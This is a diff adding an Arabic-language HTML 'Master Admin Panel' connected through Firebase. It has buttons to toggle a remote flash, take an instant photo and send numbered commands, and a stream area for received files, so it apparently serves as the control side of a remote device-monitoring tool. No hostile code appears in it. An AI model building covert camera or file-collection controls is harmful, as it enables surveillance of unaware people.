@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Master Admin Panel</title>
+    <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+    <div class="sidebar">
+        <h2>التحكم المركزي</h2>
+        <div id="status">الحالة: متصل عبر Firebase</div>
+    </div>
+    <div class="main">
+        <div class="control-grid">
+            <button class="btn danger" onclick="sendCmd('flash_on')">تشغيل الفلاش</button>
+            <button class="btn" onclick="sendCmd('flash_off')">إطفاء الفلاش</button>
+            <button class="btn" onclick="sendCmd('take_photo')">التقاط فوري</button>
+            <script>
+                for(let i=4; i<=40; i++) {
+                    document.write(`<button class="btn" onclick="sendCmd('cmd_${i}')">زر تحكم ذكي ${i}</button>`);
+                }
+            </script>
+        </div>
+        <div class="monitor">
+            <h3>الملفات المستلمة</h3>
+            <div id="dataStream" class="stream-box"></div>
+        </div>
+    </div>
+    <script type="module" src="admin.js"></script>
+</body>
+</html>
